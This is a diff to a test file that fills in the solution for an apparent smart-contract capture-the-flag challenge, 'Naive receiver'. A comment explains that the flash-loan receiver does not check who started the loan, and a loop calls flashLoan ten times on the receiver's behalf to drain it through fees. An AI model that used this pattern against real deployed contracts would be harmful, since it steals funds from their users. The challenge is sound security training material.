@@ -30,7 +30,13 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE **/   
+        /*  The loan receiver does not have any check on who iniciated the flash loan, therefore the attacker can call the lender with the receivers address. 
+        *  The Lender also could have checked who was the msg.sender of the function, and infer the borrower address, instead of receiving by parameter... */   
+        
+        for (let i = 0; i < 10; i++) {
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
+        }
     });
 
     after(async function () {
